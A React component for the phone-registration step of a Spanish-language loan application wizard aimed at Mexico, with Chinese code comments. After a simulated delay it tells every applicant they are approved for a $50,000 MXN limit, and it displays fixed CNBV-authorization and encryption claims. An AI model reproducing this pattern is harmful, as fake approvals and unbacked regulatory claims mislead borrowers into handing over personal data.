import React, { useState, useEffect } from 'react';
import { useTranslation } from 'react-i18next';
import { getApiUrl } from '../config/api';
import { httpClient, checkBrowserCompatibility } from '../utils/httpClient';
import { safeStorage, safeDateParse, arrayCompat, smoothScroll } from '../utils/browserCompat';

import { 
  trackLoanApplicationStart, 
  trackLoanApplicationComplete,
  trackFileUpload 
} from '../utils/analytics';

interface LoanApplication {
  id?: string;
  sessionId?: string;
  step: number;
  phone?: string;
  isGuest?: boolean;
  userId?: string;
  // 第2步：身份信息
  idNumber?: string;
  realName?: string;
  // 第4步：联系人信息
  contact1Name?: string;
  contact1Phone?: string;
  contact2Name?: string;
  contact2Phone?: string;
  // 第7步：银行卡
  bankCardNumber?: string;
  // 第11步：提现信息
  withdrawalAmount?: number;
  installmentPeriod?: number;
}

interface StepProps {
  data: LoanApplication;
  onUpdate: (data: Partial<LoanApplication>) => void;
  onNext: () => void;
  onBack: () => void;
  updateApplicationStep?: (step: number, stepData: any) => Promise<void>;
}

// 移动端优化的输入框样式
const mobileInputClass = "w-full max-w-full px-2 sm:px-3 md:px-4 py-2 sm:py-2.5 md:py-3 border border-slate-300 rounded-lg text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-slate-800 focus:border-slate-800 transition-colors text-sm sm:text-base box-border";

// 移动端优化的容器样式
const mobileContainerClass = "w-full max-w-full overflow-hidden px-1 sm:px-2";

// 第1步：用户注册 - 移动端优化版
const Step1UserRegistration: React.FC<StepProps> = ({ data, onUpdate, onNext, updateApplicationStep }) => {
  const { t } = useTranslation();
  const [phone, setPhone] = useState(data.phone || '');
  const [countryCode, setCountryCode] = useState('+52');
  const [showApprovedAmount, setShowApprovedAmount] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);

  const countryCodes = [
    { code: '+52', name: 'México', flag: '🇲🇽' },
    { code: '+1', name: 'Estados Unidos', flag: '🇺🇸' },
    { code: '+54', name: 'Argentina', flag: '🇦🇷' },
    { code: '+55', name: 'Brasil', flag: '🇧🇷' },
  ];

  const handleCheckEligibility = async () => {
    if (!phone) {
      alert(t('errors.required'));
      return;
    }

    setIsRegistering(true);
    
    try {
      // 模拟API调用
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      const fullPhone = `${countryCode}${phone}`;
      onUpdate({ phone: fullPhone });
      
      // 追踪贷款申请开始事件
      trackLoanApplicationStart(1, { phone: fullPhone });
      
      setShowApprovedAmount(true);
      
      if (updateApplicationStep) {
        await updateApplicationStep(1, { phone: fullPhone });
      }
    } catch (error) {
      console.error('Registration error:', error);
      alert('发生错误，请重试');
    } finally {
      setIsRegistering(false);
    }
  };

  const handleContinue = () => {
    onNext();
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100 overflow-x-hidden">
      {/* 安全认证条 */}
      <div className="bg-slate-800 text-white py-2 px-2 sm:px-4">
        <div className="max-w-4xl mx-auto flex items-center justify-center text-xs sm:text-sm">
          <div className="flex items-center space-x-3 sm:space-x-6">
            <div className="flex items-center space-x-1">
              <svg className="w-3 h-3 sm:w-4 sm:h-4" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
              </svg>
              <span className="text-slate-300">SSL Encriptado</span>
            </div>
            <div className="flex items-center space-x-1">
              <svg className="w-3 h-3 sm:w-4 sm:h-4" fill="currentColor" viewBox="0 0 20 20">
                <path fillRule="evenodd" d="M6.267 3.455a3.066 3.066 0 001.745-.723 3.066 3.066 0 013.976 0 3.066 3.066 0 001.745.723 3.066 3.066 0 012.812 2.812c.051.643.304 1.254.723 1.745a3.066 3.066 0 010 3.976 3.066 3.066 0 00-.723 1.745 3.066 3.066 0 01-2.812 2.812 3.066 3.066 0 00-1.745.723 3.066 3.066 0 01-3.976 0 3.066 3.066 0 00-1.745-.723 3.066 3.066 0 01-2.812-2.812 3.066 3.066 0 00-.723-1.745 3.066 3.066 0 010-3.976 3.066 3.066 0 00.723-1.745 3.066 3.066 0 012.812-2.812zm7.44 5.252a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z" clipRule="evenodd" />
              </svg>
              <span className="text-slate-300">Autorizado CNBV</span>
            </div>
          </div>
        </div>
      </div>

      <div className="container mx-auto px-1 sm:px-2 md:px-4 py-4 sm:py-6 md:py-8 lg:py-12 max-w-full overflow-hidden">
        <div className="max-w-2xl mx-auto w-full">
          {/* 主标题区域 */}
          <div className="text-center mb-6 sm:mb-8 lg:mb-12 px-2">
            <h1 className="text-xl sm:text-2xl lg:text-3xl font-bold text-slate-800 mb-2 sm:mb-3">
              ¡Préstamos con Interés Bajo!
            </h1>
            <p className="text-slate-600 text-sm sm:text-base lg:text-lg leading-relaxed">
              Ingresa tu número de teléfono para ver tu límite de crédito aprobado
            </p>
            <div className="mt-3 sm:mt-4 text-xs sm:text-sm text-slate-500">
              Su información será protegida con encriptación de grado bancario
            </div>
          </div>

          {/* 表单卡片 - 移动端优化 */}
          <div className="bg-white rounded-lg shadow-lg border border-slate-200 overflow-hidden mx-1 sm:mx-0">
            <div className="p-3 sm:p-4 md:p-6 lg:p-8">
              {!showApprovedAmount ? (
                <div className="space-y-4 sm:space-y-6">
                  {/* 手机号输入 - 移动端优化 */}
                  <div className={mobileContainerClass}>
                    <label className="block text-sm sm:text-base font-semibold text-slate-800 mb-2 sm:mb-3">
                      {t('loanWizard.step1.phoneLabel')}
                    </label>
                    <div className="flex w-full max-w-full overflow-hidden rounded-lg border border-slate-300">
                      <select
                        value={countryCode}
                        onChange={(e) => setCountryCode(e.target.value)}
                        className="w-12 sm:w-14 md:w-16 lg:w-20 px-1 sm:px-2 py-2 sm:py-2.5 md:py-3 bg-slate-50 text-slate-700 font-medium focus:outline-none focus:ring-2 focus:ring-slate-800 transition-colors text-xs sm:text-sm flex-shrink-0 border-r border-slate-300"
                        disabled={showApprovedAmount}
                      >
                        {countryCodes.map((country) => (
                          <option key={country.code} value={country.code}>
                            {country.flag} {country.code}
                          </option>
                        ))}
                      </select>
                      <input
                        type="tel"
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        placeholder={t('loanWizard.step1.phonePlaceholder')}
                        className="flex-1 min-w-0 w-0 px-2 sm:px-3 md:px-4 py-2 sm:py-2.5 md:py-3 text-slate-800 placeholder-slate-400 focus:outline-none focus:ring-2 focus:ring-slate-800 transition-colors text-sm sm:text-base border-0"
                        disabled={showApprovedAmount}
                      />
                    </div>
                    <div className="mt-1 sm:mt-2 text-xs sm:text-sm text-slate-500">
                      Verificaremos su número para procesar su solicitud
                    </div>
                  </div>

                  {/* 提交按钮 - 移动端优化 */}
                  <div className={mobileContainerClass}>
                    <button
                      onClick={handleCheckEligibility}
                      disabled={!phone || isRegistering}
                      className="w-full py-3 sm:py-4 bg-slate-800 text-white font-semibold text-sm sm:text-base lg:text-lg rounded-lg hover:bg-slate-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors shadow-lg"
                    >
                      {isRegistering ? (
                        <div className="flex items-center justify-center">
                          <div className="animate-spin rounded-full h-4 w-4 sm:h-5 sm:w-5 border-b-2 border-white mr-2 sm:mr-3"></div>
                          Procesando solicitud...
                        </div>
                      ) : (
                        'Ver Mi Límite de Crédito'
                      )}
                    </button>
                  </div>

                  {/* 安全提示 - 移动端优化 */}
                  <div className={`${mobileContainerClass}`}>
                    <div className="bg-slate-50 border border-slate-200 rounded-lg p-3 sm:p-4">
                      <div className="flex items-start space-x-2 sm:space-x-3">
                        <svg className="w-4 h-4 sm:w-5 sm:h-5 text-slate-600 mt-0.5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                          <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clipRule="evenodd" />
                        </svg>
                        <div>
                          <h4 className="font-semibold text-slate-800 text-xs sm:text-sm mb-1">Información Segura</h4>
                          <p className="text-slate-600 text-xs sm:text-sm leading-relaxed">
                            Sus datos personales están protegidos con tecnología de encriptación SSL de 256 bits, 
                            el mismo estándar utilizado por los bancos más importantes.
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="space-y-4 sm:space-y-6">
                  {/* 结果展示 - 移动端优化 */}
                  <div className="text-center py-4 sm:py-6">
                    <div className="inline-flex items-center justify-center w-12 h-12 sm:w-16 sm:h-16 bg-emerald-100 rounded-full mb-3 sm:mb-4">
                      <svg className="w-6 h-6 sm:w-8 sm:h-8 text-emerald-600" fill="currentColor" viewBox="0 0 20 20">
                        <path fillRule="evenodd" d="M16.707 5.293a1 1 0 010 1.414l-8 8a1 1 0 01-1.414 0l-4-4a1 1 0 011.414-1.414L8 12.586l7.293-7.293a1 1 0 011.414 0z" clipRule="evenodd" />
                      </svg>
                    </div>
                    <h3 className="text-lg sm:text-xl font-bold text-slate-800 mb-2">
                      ¡Felicidades! Tu límite de crédito es:
                    </h3>
                    <div className="text-3xl sm:text-4xl lg:text-5xl font-bold text-emerald-600 mb-2">
                      $50,000 <span className="text-xl sm:text-2xl lg:text-3xl text-slate-600">MXN</span>
                    </div>
                    <p className="text-slate-600 text-sm sm:text-base">
                      Préstamo con interés bajo disponible ahora
                    </p>
                  </div>
                  
                  {/* 优势展示 - 移动端优化 */}
                  <div className="bg-slate-50 border border-slate-200 rounded-lg p-4 sm:p-6">
                    <h4 className="font-semibold text-slate-800 text-base sm:text-lg mb-3 sm:mb-4">Beneficios de tu préstamo:</h4>
                    <div className="grid grid-cols-1 gap-3 sm:gap-4">
                      <div className="flex items-center space-x-2 sm:space-x-3">
                        <div className="w-2 h-2 bg-slate-800 rounded-full flex-shrink-0"></div>
                        <span className="text-slate-700 text-sm sm:text-base">Tasa de interés baja: 15% OFF</span>
                      </div>
                      <div className="flex items-center space-x-2 sm:space-x-3">
                        <div className="w-2 h-2 bg-slate-800 rounded-full flex-shrink-0"></div>
                        <span className="text-slate-700 text-sm sm:text-base">Hasta 100,000 pesos de crédito</span>
                      </div>
                      <div className="flex items-center space-x-2 sm:space-x-3">
                        <div className="w-2 h-2 bg-slate-800 rounded-full flex-shrink-0"></div>
                        <span className="text-slate-700 text-sm sm:text-base">Sin comisión de procesamiento</span>
                      </div>
                      <div className="flex items-center space-x-2 sm:space-x-3">
                        <div className="w-2 h-2 bg-slate-800 rounded-full flex-shrink-0"></div>
                        <span className="text-slate-700 text-sm sm:text-base">Pago anticipado sin penalización</span>
                      </div>
                    </div>
                  </div>

                  {/* 继续按钮 - 移动端优化 */}
                  <button
                    onClick={handleContinue}
                    className="w-full py-3 sm:py-4 bg-slate-800 text-white font-semibold text-sm sm:text-base lg:text-lg rounded-lg hover:bg-slate-700 transition-colors shadow-lg"
                  >
                    Continuar con mi Solicitud
                  </button>
                </div>
              )}
            </div>
          </div>

          {/* 底部信任标识 - 移动端优化 */}
          <div className="mt-6 sm:mt-8 text-center px-2">
            <div className="flex items-center justify-center space-x-4 sm:space-x-8 text-xs sm:text-sm text-slate-500 flex-wrap gap-2">
              <div className="flex items-center space-x-1">
                <svg className="w-3 h-3 sm:w-4 sm:h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z" />
                </svg>
                <span>Regulado CNBV</span>
              </div>
              <div className="flex items-center space-x-1">
                <svg className="w-3 h-3 sm:w-4 sm:h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
                </svg>
                <span>Datos Seguros</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Step1UserRegistration;